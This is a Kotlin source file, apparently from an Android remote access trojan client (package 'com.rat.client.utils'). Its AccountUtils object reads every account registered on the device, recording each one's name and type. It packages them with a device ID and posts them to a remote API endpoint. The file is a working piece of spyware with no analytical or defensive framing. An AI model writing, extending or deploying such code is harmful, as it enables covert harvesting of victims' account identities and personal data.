package com.rat.client.utils

import android.accounts.AccountManager
import android.content.Context
import android.util.Log
import com.rat.client.Config
import org.json.JSONArray
import org.json.JSONObject

/**
 * Enumerates accounts registered on the device.
 */
object AccountUtils {
    private const val TAG = "AccountUtils"

    fun getAccounts(context: Context) {
        try {
            val accountManager = AccountManager.get(context)
            val accounts = accountManager.accounts
            val accountsList = JSONArray()

            for (account in accounts) {
                val acc = JSONObject()
                acc.put("name", account.name)
                acc.put("type", account.type)
                accountsList.put(acc)
            }

            if (accountsList.length() > 0) {
                val payload = JSONObject()
                payload.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                payload.put("accounts", accountsList)

                ApiClient.post(Config.Api.ACCOUNTS, payload)
                Log.d(TAG, "Sent ${accountsList.length()} accounts")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Accounts error: ${e.message}")
        }
    }
}

